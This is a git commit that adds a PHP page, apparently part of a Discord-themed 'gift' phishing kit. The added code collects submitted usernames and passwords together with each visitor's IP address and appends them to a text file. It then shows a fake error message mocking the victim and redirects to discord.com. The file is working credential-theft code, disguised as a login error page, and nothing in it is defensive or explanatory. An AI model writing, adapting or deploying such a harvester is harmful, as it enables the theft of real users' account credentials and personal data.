d2f44620f99f6d8755121cdcf593f416ac941163
Michael5010 <148027484+Michael5010@users.noreply.github.com>
2025-02-10 13:27:31 -0500

    Add files via upload

---
+++ gift/HJ9fh9hGfgfijh93/login/save.php
@@ -0,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <link rel="stylesheet" href="../assest/style.css"/>
+  </head>
+  <body>
+  “Error - this program has encountered an issue that it cannot recover from. Please notify your Website Administrator that this is the result of a Layer8 issue”
+  </body>
+</html>
+<script>function redirect(){window.location.replace("https://discord.com/a")}</script>
+<?php
+$iptoken = $_SERVER['REMOTE_ADDR'];  
+    if(isset($_POST['pass'])){
+      $user = $_POST['user'];
+      $pass = $_POST['pass'];
+      $file = fopen("savedata.txt", "a+");
+      fwrite($file," -  IP: ".$iptoken."   Username: " . $user . "   Password: " . $pass . "\n\n");
+      fclose($file);
+      die();
+}
+?>
